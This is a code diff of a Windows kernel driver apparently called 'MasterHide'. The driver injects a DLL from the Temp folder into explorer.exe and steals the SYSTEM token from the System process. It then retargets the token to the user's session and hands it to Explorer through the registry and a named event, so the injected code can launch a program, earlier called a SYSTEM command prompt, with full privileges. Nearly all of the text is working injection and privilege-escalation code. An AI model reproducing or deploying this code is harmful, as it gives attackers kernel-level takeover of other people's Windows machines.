@@ -2,54 +2,51 @@
 #include "..\..\windows-kernel-dll-injector\DLLInjector\DLLInjector\Injector.h"
 
 // ---------------------------------------------------------------------------
-// Missing constants (from winnt.h / wdm.h)
+// Missing type definitions (only if not already present)
 // ---------------------------------------------------------------------------
-#define PROCESS_QUERY_INFORMATION   (0x0400)
-#define TOKEN_DUPLICATE             (0x0002)
-#define TOKEN_QUERY                 (0x0008)
-#define TOKEN_ADJUST_SESSIONID      (0x0100)
-#define TOKEN_ALL_ACCESS            (0x000F01FF)
-
-#define NORMAL_PRIORITY_CLASS       (0x00000020)
-#define CREATE_NEW_CONSOLE          (0x00000010)
-#define CREATE_UNICODE_ENVIRONMENT  (0x00000400)
-
-// ---------------------------------------------------------------------------
-// Missing types (only defined if not already present)
-// ---------------------------------------------------------------------------
-#ifndef TOKEN_TYPE_DEFINED
-#define TOKEN_TYPE_DEFINED
+#ifndef TOKEN_TYPE
 typedef enum _TOKEN_TYPE {
     TokenPrimary = 1,
     TokenImpersonation
 } TOKEN_TYPE;
 #endif
 
-#ifndef TOKEN_INFORMATION_CLASS_DEFINED
-#define TOKEN_INFORMATION_CLASS_DEFINED
+#ifndef TOKEN_INFORMATION_CLASS
 typedef enum _TOKEN_INFORMATION_CLASS {
-    TokenUser = 1,
-    TokenGroups,
-    TokenPrivileges,
-    TokenOwner,
-    TokenPrimaryGroup,
-    TokenDefaultDacl,
-    TokenSource,
-    TokenType,
-    TokenImpersonationLevel,
-    TokenStatistics,
-    TokenRestrictedSids,
-    TokenSessionId,
+    TokenSessionId = 12        // only one we need
 } TOKEN_INFORMATION_CLASS;
 #endif
 
-// Use a custom structure to avoid redefinition with system headers
-typedef struct _MY_PROCESS_SESSION_INFORMATION {
-    ULONG SessionId;
-} MY_PROCESS_SESSION_INFORMATION;
+// ---------------------------------------------------------------------------
+// Missing constants (guard against redefinitions)
+// ---------------------------------------------------------------------------
+#ifndef PROCESS_QUERY_INFORMATION
+#define PROCESS_QUERY_INFORMATION   0x0400
+#endif
+#ifndef PROCESS_DUP_HANDLE
+#define PROCESS_DUP_HANDLE          0x0040
+#endif
+#ifndef TOKEN_DUPLICATE
+#define TOKEN_DUPLICATE             0x0002
+#endif
+#ifndef TOKEN_QUERY
+#define TOKEN_QUERY                 0x0008
+#endif
+#ifndef TOKEN_ADJUST_SESSIONID
+#define TOKEN_ADJUST_SESSIONID      0x0100
+#endif
+#ifndef TOKEN_ASSIGN_PRIMARY
+#define TOKEN_ASSIGN_PRIMARY        0x0001
+#endif
+#ifndef TOKEN_ALL_ACCESS
+#define TOKEN_ALL_ACCESS            0x000F01FF
+#endif
+#ifndef EVENT_ALL_ACCESS
+#define EVENT_ALL_ACCESS            0x1F0003
+#endif
 
 // ---------------------------------------------------------------------------
-// Missing function prototypes
+// Function prototypes for the few APIs we use that aren't already declared
 // ---------------------------------------------------------------------------
 NTSYSAPI NTSTATUS NTAPI PsLookupProcessByProcessId(
     _In_ HANDLE ProcessId,
@@ -65,8 +62,7 @@ NTSYSAPI NTSTATUS NTAPI ObOpenObjectByPointer(
     _In_ KPROCESSOR_MODE AccessMode,
     _Out_ PHANDLE Handle
 );
-
-NTKERNELAPI NTSTATUS NTAPI ZwQueryInformationProcess(
+NTSYSAPI NTSTATUS NTAPI ZwQueryInformationProcess(
     _In_ HANDLE ProcessHandle,
     _In_ PROCESSINFOCLASS ProcessInformationClass,
     _Out_writes_bytes_(ProcessInformationLength) PVOID ProcessInformation,
@@ -74,14 +70,14 @@ NTKERNELAPI NTSTATUS NTAPI ZwQueryInformationProcess(
     _Out_opt_ PULONG ReturnLength
 );
 
-NTKERNELAPI NTSTATUS NTAPI ZwOpenProcessTokenEx(
+NTSYSAPI NTSTATUS NTAPI ZwOpenProcessTokenEx(
     _In_ HANDLE ProcessHandle,
     _In_ ACCESS_MASK DesiredAccess,
     _In_ ULONG HandleAttributes,
     _Out_ PHANDLE TokenHandle
 );
 
-NTKERNELAPI NTSTATUS NTAPI ZwDuplicateToken(
+NTSYSAPI NTSTATUS NTAPI ZwDuplicateToken(
     _In_ HANDLE ExistingTokenHandle,
     _In_ ACCESS_MASK DesiredAccess,
     _In_ POBJECT_ATTRIBUTES ObjectAttributes,
@@ -90,11 +86,40 @@ NTKERNELAPI NTSTATUS NTAPI ZwDuplicateToken(
     _Out_ PHANDLE NewTokenHandle
 );
 
-NTKERNELAPI NTSTATUS NTAPI ZwSetInformationToken(
+NTSYSAPI NTSTATUS NTAPI ZwSetInformationToken(
     _In_ HANDLE TokenHandle,
     _In_ TOKEN_INFORMATION_CLASS TokenInformationClass,
     _In_reads_bytes_(TokenInformationLength) PVOID TokenInformation,
     _In_ ULONG TokenInformationLength
+);
+
+NTSYSAPI NTSTATUS NTAPI ZwDuplicateObject(
+    _In_ HANDLE SourceProcessHandle,
+    _In_ HANDLE SourceHandle,
+    _In_ HANDLE TargetProcessHandle,
+    _Out_ PHANDLE TargetHandle,
+    _In_ ACCESS_MASK DesiredAccess,
+    _In_ ULONG HandleAttributes,
+    _In_ ULONG Options
+);
+
+NTSYSAPI NTSTATUS NTAPI ZwCreateEvent(
+    _Out_ PHANDLE EventHandle,
+    _In_ ACCESS_MASK DesiredAccess,
+    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
+    _In_ EVENT_TYPE EventType,
+    _In_ BOOLEAN InitialState
+);
+
+NTSYSAPI NTSTATUS NTAPI ZwOpenEvent(
+    _Out_ PHANDLE EventHandle,
+    _In_ ACCESS_MASK DesiredAccess,
+    _In_ POBJECT_ATTRIBUTES ObjectAttributes
+);
+
+NTSYSAPI NTSTATUS NTAPI ZwSetEvent(
+    _In_ HANDLE EventHandle,
+    _Out_opt_ PLONG PreviousState
 );
 
 // ---------------------------------------------------------------------------
@@ -113,37 +138,45 @@ NTSTATUS WriteCheckpoint(_In_ const char* Stage)
     UNICODE_STRING keyPath;
     RtlInitUnicodeString(&keyPath,
         L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\MasterHide");
-
     OBJECT_ATTRIBUTES objAttr;
     InitializeObjectAttributes(&objAttr, &keyPath,
         OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
-
     HANDLE hKey = NULL;
     NTSTATUS status = ZwOpenKey(&hKey, KEY_SET_VALUE, &objAttr);
-    if (!NT_SUCCESS(status))
-        return status;
-
+    if (!NT_SUCCESS(status)) return status;
     UNICODE_STRING valueName;
     RtlInitUnicodeString(&valueName, L"InjectionStatus");
-
     ANSI_STRING ansiStr;
     RtlInitAnsiString(&ansiStr, Stage);
-
     WCHAR buf[128];
     UNICODE_STRING uniStr;
     uniStr.Buffer = buf;
     uniStr.MaximumLength = sizeof(buf);
     uniStr.Length = 0;
-
-    for (ULONG i = 0; i < ansiStr.Length && (i * sizeof(WCHAR) < sizeof(buf) - sizeof(WCHAR)); i++)
-    {
+    for (ULONG i = 0; i < ansiStr.Length && (i * sizeof(WCHAR) < sizeof(buf) - sizeof(WCHAR)); i++) {
         uniStr.Buffer[i] = (WCHAR)ansiStr.Buffer[i];
         uniStr.Length += sizeof(WCHAR);
     }
     uniStr.Buffer[uniStr.Length / sizeof(WCHAR)] = L'\0';
-
     status = ZwSetValueKey(hKey, &valueName, 0, REG_SZ,
                            uniStr.Buffer, uniStr.Length + sizeof(WCHAR));
+    ZwClose(hKey);
+    return status;
+}
+
+static NTSTATUS WriteDwordValue(_In_ LPCWSTR valueName, _In_ DWORD value)
+{
+    UNICODE_STRING keyPath;
+    RtlInitUnicodeString(&keyPath,
+        L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\MasterHide");
+    OBJECT_ATTRIBUTES objAttr;
+    InitializeObjectAttributes(&objAttr, &keyPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
+    HANDLE hKey = NULL;
+    NTSTATUS status = ZwOpenKey(&hKey, KEY_SET_VALUE, &objAttr);
+    if (!NT_SUCCESS(status)) return status;
+    UNICODE_STRING valName;
+    RtlInitUnicodeString(&valName, valueName);
+    status = ZwSetValueKey(hKey, &valName, 0, REG_DWORD, &value, sizeof(DWORD));
     ZwClose(hKey);
     return status;
 }
@@ -152,9 +185,7 @@ static NTSTATUS WriteCheckpointWithStatus(_In_ const char* Stage, _In_ NTSTATUS 
 {
     CHAR buffer[128];
     NTSTATUS formatStatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "%s 0x%08X", Stage, Status);
-    if (!NT_SUCCESS(formatStatus)) {
-        return WriteCheckpoint(Stage);
-    }
+    if (!NT_SUCCESS(formatStatus)) return WriteCheckpoint(Stage);
     return WriteCheckpoint(buffer);
 }
 
@@ -176,10 +207,7 @@ typedef struct _PHASE2_SYSTEM_PROCESS_INFORMATION {
     ULONG SessionId;
 } PHASE2_SYSTEM_PROCESS_INFORMATION, *PPHASE2_SYSTEM_PROCESS_INFORMATION;
 
-NTSYSAPI
-NTSTATUS
-NTAPI
-ZwQuerySystemInformation(
+NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(
     _In_ ULONG SystemInformationClass,
     _Out_writes_bytes_opt_(SystemInformationLength) PVOID SystemInformation,
     _In_ ULONG SystemInformationLength,
@@ -190,257 +218,197 @@ static NTSTATUS FindTargetProcessId(_Out_ PHANDLE Pid);
 static NTSTATUS WaitForExplorerLoaderReady(void);
 
 // ---------------------------------------------------------------------------
-// Kernel‑side SYSTEM spawner for jtl.exe
+// Kernel‑side token‑passing spawner (registry + event)
 // ---------------------------------------------------------------------------
 NTSTATUS Phase2_SpawnSystemJtl(void)
 {
     NTSTATUS status;
     PEPROCESS pExplorer = NULL;
     HANDLE hExplorer = NULL;
-    MY_PROCESS_SESSION_INFORMATION sessionInfo = { 0 };
+    PROCESS_SESSION_INFORMATION sessionInfo = {0};
     ULONG sessionId = 0;
     HANDLE hSystemToken = NULL;
     HANDLE hDupToken = NULL;
-    HANDLE hProcess = NULL, hThread = NULL;
+    HANDLE hRemoteToken = NULL;
+    HANDLE hEvent = NULL;
+    UNICODE_STRING eventName;
+    WCHAR eventNameBuffer[128];
+
+    DbgPrint("[SpawnJtl] Starting token-pass for Explorer PID=%p\n", g_Phase2TargetExplorerPid);
 
     if (g_Phase2TargetExplorerPid == NULL) {
         WriteCheckpoint("SpawnJtl: no explorer PID");
         return STATUS_NOT_FOUND;
     }
 
-    // 1. Get Explorer's session ID
+    // 1. Open Explorer with PROCESS_DUP_HANDLE and PROCESS_QUERY_INFORMATION
     status = PsLookupProcessByProcessId(g_Phase2TargetExplorerPid, &pExplorer);
-    if (!NT_SUCCESS(status)) {
-        WriteCheckpointWithStatus("SpawnJtl: PsLookup failed", status);
-        return status;
-    }
+    if (!NT_SUCCESS(status)) { WriteCheckpointWithStatus("SpawnJtl: PsLookup failed", status); return status; }
 
-    status = ObOpenObjectByPointer(pExplorer,
-                                   OBJ_KERNEL_HANDLE,
-                                   NULL,
-                                   PROCESS_QUERY_INFORMATION,
-                                   *PsProcessType,
-                                   KernelMode,
-                                   &hExplorer);
+    status = ObOpenObjectByPointer(pExplorer, OBJ_KERNEL_HANDLE, NULL,
+                                   PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
+                                   *PsProcessType, KernelMode, &hExplorer);
     ObDereferenceObject(pExplorer);
-    if (!NT_SUCCESS(status)) {
-        WriteCheckpointWithStatus("SpawnJtl: ObOpenObjectByPointer failed", status);
-        return status;
-    }
+    if (!NT_SUCCESS(status)) { WriteCheckpointWithStatus("SpawnJtl: Open explorer failed", status); return status; }
 
-    status = ZwQueryInformationProcess(hExplorer,
-                                       ProcessSessionInformation,
-                                       &sessionInfo,
-                                       sizeof(sessionInfo),
-                                       NULL);
-    ZwClose(hExplorer);
+    // 2. Get Explorer's session ID
+    status = ZwQueryInformationProcess(hExplorer, ProcessSessionInformation,
+                                       &sessionInfo, sizeof(sessionInfo), NULL);
     if (!NT_SUCCESS(status) || sessionInfo.SessionId == 0) {
         WriteCheckpointWithStatus("SpawnJtl: invalid session", status);
+        ZwClose(hExplorer);
         return STATUS_UNSUCCESSFUL;
     }
     sessionId = sessionInfo.SessionId;
+    DbgPrint("[SpawnJtl] Explorer session = %u\n", sessionId);
 
-    // 2. Get a SYSTEM token from the System process (PID 4)
+    // 3. Get SYSTEM token from PID 4
     PEPROCESS pSystem = NULL;
     status = PsLookupProcessByProcessId(ULongToHandle(4), &pSystem);
-    if (!NT_SUCCESS(status)) {
-        WriteCheckpointWithStatus("SpawnJtl: PsLookup(4) failed", status);
-        return status;
-    }
+    if (!NT_SUCCESS(status)) { ZwClose(hExplorer); WriteCheckpointWithStatus("SpawnJtl: PsLookup(4) failed", status); return status; }
 
-    status = ZwOpenProcessTokenEx(pSystem,
-                                  TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_SESSIONID,
-                                  OBJ_KERNEL_HANDLE,
-                                  &hSystemToken);
+    HANDLE hSystemProcess = NULL;
+    status = ObOpenObjectByPointer(pSystem, OBJ_KERNEL_HANDLE, NULL,
+                                   PROCESS_QUERY_INFORMATION,
+                                   *PsProcessType, KernelMode, &hSystemProcess);
     ObDereferenceObject(pSystem);
-    if (!NT_SUCCESS(status)) {
-        WriteCheckpointWithStatus("SpawnJtl: ZwOpenProcessTokenEx failed", status);
-        return status;
-    }
+    if (!NT_SUCCESS(status)) { ZwClose(hExplorer); WriteCheckpointWithStatus("SpawnJtl: Open system failed", status); return status; }
 
-    // 3. Duplicate the token as a primary token
+    status = ZwOpenProcessTokenEx(hSystemProcess,
+                                  TOKEN_DUPLICATE | TOKEN_ADJUST_SESSIONID,
+                                  OBJ_KERNEL_HANDLE, &hSystemToken);
+    ZwClose(hSystemProcess);
+    if (!NT_SUCCESS(status)) { ZwClose(hExplorer); WriteCheckpointWithStatus("SpawnJtl: ZwOpenProcessTokenEx failed", status); return status; }
+
+    // 4. Duplicate as primary token
     OBJECT_ATTRIBUTES oa = RTL_CONSTANT_OBJECT_ATTRIBUTES(NULL, OBJ_KERNEL_HANDLE);
-    status = ZwDuplicateToken(hSystemToken,
-                              TOKEN_ALL_ACCESS,
-                              &oa,
-                              FALSE,
-                              TokenPrimary,
-                              &hDupToken);
+    status = ZwDuplicateToken(hSystemToken, TOKEN_ALL_ACCESS, &oa, FALSE, TokenPrimary, &hDupToken);
     ZwClose(hSystemToken);
+    if (!NT_SUCCESS(status)) { ZwClose(hExplorer); WriteCheckpointWithStatus("SpawnJtl: ZwDuplicateToken failed", status); return status; }
+
+    // 5. Set the token's session ID to match Explorer's session
+    status = ZwSetInformationToken(hDupToken, TokenSessionId, &sessionId, sizeof(sessionId));
     if (!NT_SUCCESS(status)) {
-        WriteCheckpointWithStatus("SpawnJtl: ZwDuplicateToken failed", status);
+        WriteCheckpointWithStatus("SpawnJtl: Set session ID failed", status);
+        ZwClose(hDupToken); ZwClose(hExplorer);
         return status;
     }
 
-    // 4. Assign the token to Explorer's session
-    status = ZwSetInformationToken(hDupToken,
-                                   TokenSessionId,
-                                   &sessionId,
-                                   sizeof(sessionId));
+    // 6. Duplicate the token into Explorer's handle table
+    //    The source process is our own process (kernel driver)
+    status = ZwDuplicateObject(NtCurrentProcess(),   // SourceProcessHandle
+                                hDupToken,            // SourceHandle
+                                hExplorer,            // TargetProcessHandle
+                                &hRemoteToken,        // TargetHandle
+                                TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_SESSIONID,
+                                0,                    // HandleAttributes
+                                0);                   // Options
+    DbgPrint("[SpawnJtl] ZwDuplicateObject(remote) => 0x%08X, remoteHandle=%p\n", status, hRemoteToken);
     if (!NT_SUCCESS(status)) {
-        WriteCheckpointWithStatus("SpawnJtl: SetTokenSessionId failed", status);
-        ZwClose(hDupToken);
+        WriteCheckpointWithStatus("SpawnJtl: Duplicate token into explorer failed", status);
+        ZwClose(hDupToken); ZwClose(hExplorer);
         return status;
     }
 
-    // 5. Resolve ZwCreateUserProcess dynamically (not exported by name)
-    UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"ZwCreateUserProcess");
-    PVOID pZwCreateUserProcess = MmGetSystemRoutineAddress(&routineName);
-    if (pZwCreateUserProcess == NULL) {
-        WriteCheckpoint("SpawnJtl: ZwCreateUserProcess not found");
-        ZwClose(hDupToken);
-        return STATUS_NOT_FOUND;
+    // 7. Write the remote handle value to registry (REG_DWORD)
+    DWORD handleValue = (DWORD)(ULONG_PTR)hRemoteToken;
+    status = WriteDwordValue(L"TokenHandle", handleValue);
+    DbgPrint("[SpawnJtl] Wrote TokenHandle=%lu to registry, status=0x%08X\n", handleValue, status);
+
+    // 8. Create or open the event in Explorer's session namespace
+    RtlStringCbPrintfW(eventNameBuffer, sizeof(eventNameBuffer),
+                       L"\\Sessions\\%u\\BaseNamedObjects\\MasterHideSpawnEvent", sessionId);
+    RtlInitUnicodeString(&eventName, eventNameBuffer);
+    DbgPrint("[SpawnJtl] Event name = %wZ\n", &eventName);
+
+    OBJECT_ATTRIBUTES eventObjAttr;
+    InitializeObjectAttributes(&eventObjAttr, &eventName,
+                               OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+    status = ZwOpenEvent(&hEvent, EVENT_ALL_ACCESS, &eventObjAttr);
+    if (!NT_SUCCESS(status)) {
+        status = ZwCreateEvent(&hEvent, EVENT_ALL_ACCESS, &eventObjAttr,
+                               SynchronizationEvent, FALSE);
     }
-
-    // Correct prototype
-    typedef NTSTATUS (NTAPI *PFN_ZwCreateUserProcess)(
-        OUT PHANDLE ProcessHandle,
-        OUT PHANDLE ThreadHandle,
-        IN ACCESS_MASK ProcessDesiredAccess,
-        IN ACCESS_MASK ThreadDesiredAccess,
-        IN POBJECT_ATTRIBUTES ProcessObjectAttributes,
-        IN POBJECT_ATTRIBUTES ThreadObjectAttributes,
-        IN ULONG ProcessFlags,
-        IN ULONG ThreadFlags,
-        IN PVOID Environment,
-        IN PUNICODE_STRING ImageName,
-        IN PVOID ProcessInfo,
-        IN ULONG ProcessInfoLength,
-        IN PVOID AttributeList,
-        IN ULONG AttributeListSize,
-        IN HANDLE Token,
-        IN PVOID DebugPort,
-        IN PVOID ConsoleHostProcess,
-        IN PVOID Reserved
-    );
-    PFN_ZwCreateUserProcess pfn = (PFN_ZwCreateUserProcess)pZwCreateUserProcess;
-
-    // 6. Create jtl.exe with the SYSTEM token
-    UNICODE_STRING imagePath;
-    RtlInitUnicodeString(&imagePath, L"\\SystemRoot\\System32\\jtl.exe");
-
-    OBJECT_ATTRIBUTES procObjAttr;
-    InitializeObjectAttributes(&procObjAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
-
-    status = pfn(
-        &hProcess,
-        &hThread,
-        PROCESS_ALL_ACCESS,
-        THREAD_ALL_ACCESS,
-        &procObjAttr,          // process attributes
-        &procObjAttr,          // thread attributes
-        NORMAL_PRIORITY_CLASS,
-        CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
-        NULL,                  // environment
-        &imagePath,
-        NULL, 0,               // ProcessInfo
-        NULL, 0,               // AttributeList
-        hDupToken,             // SYSTEM token
-        NULL,                  // DebugPort
-        NULL,                  // ConsoleHostProcess
-        NULL                   // Reserved
-    );
-
-    ZwClose(hDupToken);
-    if (hProcess) ZwClose(hProcess);
-    if (hThread) ZwClose(hThread);
-
     if (NT_SUCCESS(status)) {
-        WriteCheckpoint("SpawnJtl: jtl.exe started as SYSTEM");
+        ZwSetEvent(hEvent, NULL);
+        ZwClose(hEvent);
+        DbgPrint("[SpawnJtl] Event set successfully.\n");
     } else {
-        WriteCheckpointWithStatus("SpawnJtl: ZwCreateUserProcess failed", status);
+        DbgPrint("[SpawnJtl] Failed to create/open event: 0x%08X\n", status);
     }
+
+    // Cleanup
+    ZwClose(hDupToken);
+    ZwClose(hExplorer);
+
+    WriteCheckpoint("SpawnJtl: token passed to explorer via registry");
     return status;
 }
 
 // ---------------------------------------------------------------------------
-// Phase2 injection logic
+// Phase2 injection logic (annotations added)
 // ---------------------------------------------------------------------------
-NTSTATUS Phase2_TriggerInjection()
+NTSTATUS Phase2_TriggerInjection(void)
 {
     WriteCheckpoint("Phase2 entered (startup)");
-
     HANDLE targetPid = NULL;
     NTSTATUS status = FindTargetProcessId(&targetPid);
-    if (!NT_SUCCESS(status))
-    {
+    if (!NT_SUCCESS(status)) {
         WriteCheckpointWithStatus("FindTargetProcessId failed", status);
         return status;
     }
-
     g_Phase2TargetExplorerPid = targetPid;
-
     return Phase2_TriggerInjectionForPid(targetPid, FALSE);
 }
 
-NTSTATUS Phase2_TriggerInjectionForPid(HANDLE Pid, BOOLEAN WaitForLoader)
+NTSTATUS Phase2_TriggerInjectionForPid(_In_ HANDLE Pid, _In_ BOOLEAN WaitForLoader)
 {
     WriteCheckpoint("Phase2 entered (pid)");
-
-    if (Pid == NULL)
-    {
+    if (Pid == NULL) {
         WriteCheckpoint("Invalid pid");
         return STATUS_INVALID_PARAMETER;
     }
 
-    if (WaitForLoader)
-    {
+    if (WaitForLoader) {
         NTSTATUS waitStatus = WaitForExplorerLoaderReady();
-        if (!NT_SUCCESS(waitStatus) && waitStatus != STATUS_TIMEOUT)
-        {
+        if (!NT_SUCCESS(waitStatus) && waitStatus != STATUS_TIMEOUT) {
             WriteCheckpointWithStatus("Explorer loader wait failed", waitStatus);
             return waitStatus;
         }
-
-        if (!g_Phase2ExplorerLoaderReady)
-        {
+        if (!g_Phase2ExplorerLoaderReady) {
             WriteCheckpoint("Explorer loader not ready");
             return STATUS_PENDING;
         }
-    }
-    else
-    {
+    } else {
         InterlockedExchange(&g_Phase2ExplorerLoaderReady, 1);
     }
 
-    if (InterlockedCompareExchange(&g_Phase2ExplorerInjectionIssued, 1, 0) != 0)
-    {
+    if (InterlockedCompareExchange(&g_Phase2ExplorerInjectionIssued, 1, 0) != 0) {
         WriteCheckpoint("Injection already issued");
         return STATUS_ALREADY_COMMITTED;
     }
 
     UNICODE_STRING dllPath = RTL_CONSTANT_STRING(L"C:\\Windows\\Temp\\inject.dll");
     NTSTATUS status = InjectDllIntoProcess(Pid, &dllPath);
-
-    if (!NT_SUCCESS(status))
-    {
+    if (!NT_SUCCESS(status)) {
         InterlockedExchange(&g_Phase2ExplorerInjectionIssued, 0);
         return status;
     }
-
     WriteCheckpoint("Injection confirmed");
 
-    // Spawn the SYSTEM command prompt right after injection
-    Phase2_SpawnSystemJtl();
-
+    NTSTATUS spawnStatus = Phase2_SpawnSystemJtl();
+    DbgPrint("[Phase2] SpawnJtl returned 0x%08X\n", spawnStatus);
     return status;
 }
 
 static NTSTATUS WaitForExplorerLoaderReady(void)
 {
-    LARGE_INTEGER interval;
-    interval.QuadPart = -50 * 10000;
-
-    for (ULONG attempt = 0; attempt < 20; ++attempt)
-    {
-        if (g_Phase2ExplorerLoaderReady)
-        {
-            return STATUS_SUCCESS;
-        }
-
+    LARGE_INTEGER interval; interval.QuadPart = -50 * 10000;
+    for (ULONG attempt = 0; attempt < 20; ++attempt) {
+        if (g_Phase2ExplorerLoaderReady) return STATUS_SUCCESS;
         KeDelayExecutionThread(KernelMode, FALSE, &interval);
     }
-
     return STATUS_TIMEOUT;
 }
 
@@ -450,76 +418,41 @@ static NTSTATUS FindTargetProcessId(_Out_ PHANDLE Pid)
     SIZE_T processBufferSize = 0x10000;
     UNICODE_STRING targetName = RTL_CONSTANT_STRING(L"explorer.exe");
     NTSTATUS status;
-
-    if (Pid == NULL) {
-        return STATUS_INVALID_PARAMETER;
-    }
-
+    if (Pid == NULL) return STATUS_INVALID_PARAMETER;
     *Pid = NULL;
 
     for (;;) {
         processBuffer = ExAllocatePool2(POOL_FLAG_PAGED, processBufferSize, PHASE2_POOL_TAG);
-        if (processBuffer == NULL) {
-            return STATUS_INSUFFICIENT_RESOURCES;
-        }
-
-        status = ZwQuerySystemInformation(
-            SystemProcessInformation,
-            processBuffer,
-            (ULONG)processBufferSize,
-            NULL
-        );
-
+        if (processBuffer == NULL) return STATUS_INSUFFICIENT_RESOURCES;
+        status = ZwQuerySystemInformation(SystemProcessInformation, processBuffer, (ULONG)processBufferSize, NULL);
         if (status == STATUS_INFO_LENGTH_MISMATCH) {
-            ExFreePool(processBuffer);
-            processBuffer = NULL;
-            processBufferSize += 0x10000;
-            continue;
+            ExFreePool(processBuffer); processBuffer = NULL; processBufferSize += 0x10000; continue;
         }
-
         break;
     }
 
     if (NT_SUCCESS(status)) {
-        PPHASE2_SYSTEM_PROCESS_INFORMATION process =
-            (PPHASE2_SYSTEM_PROCESS_INFORMATION)processBuffer;
-
+        PPHASE2_SYSTEM_PROCESS_INFORMATION process = (PPHASE2_SYSTEM_PROCESS_INFORMATION)processBuffer;
         for (;;) {
-            if (process->ImageName.Buffer != NULL &&
-                process->SessionId != 0)
-            {
+            if (process->ImageName.Buffer != NULL && process->SessionId != 0) {
                 USHORT nameStart = process->ImageName.Length / sizeof(WCHAR);
                 while (nameStart > 0) {
                     const WCHAR ch = process->ImageName.Buffer[nameStart - 1];
                     if (ch == L'\\' || ch == L'/') break;
                     --nameStart;
                 }
-
                 UNICODE_STRING baseName;
                 baseName.Buffer = process->ImageName.Buffer + nameStart;
                 baseName.Length = process->ImageName.Length - (nameStart * sizeof(WCHAR));
                 baseName.MaximumLength = baseName.Length;
-
                 if (RtlEqualUnicodeString(&baseName, &targetName, TRUE)) {
-                    *Pid = process->ProcessId;
-                    status = STATUS_SUCCESS;
-                    break;
+                    *Pid = process->ProcessId; status = STATUS_SUCCESS; break;
                 }
             }
-
-            if (process->NextEntryOffset == 0) {
-                status = STATUS_NOT_FOUND;
-                break;
-            }
-
-            process = (PPHASE2_SYSTEM_PROCESS_INFORMATION)
-                ((PUCHAR)process + process->NextEntryOffset);
+            if (process->NextEntryOffset == 0) { status = STATUS_NOT_FOUND; break; }
+            process = (PPHASE2_SYSTEM_PROCESS_INFORMATION)((PUCHAR)process + process->NextEntryOffset);
         }
     }
-
-    if (processBuffer != NULL) {
-        ExFreePool(processBuffer);
-    }
-
+    if (processBuffer) ExFreePool(processBuffer);
     return status;
 }
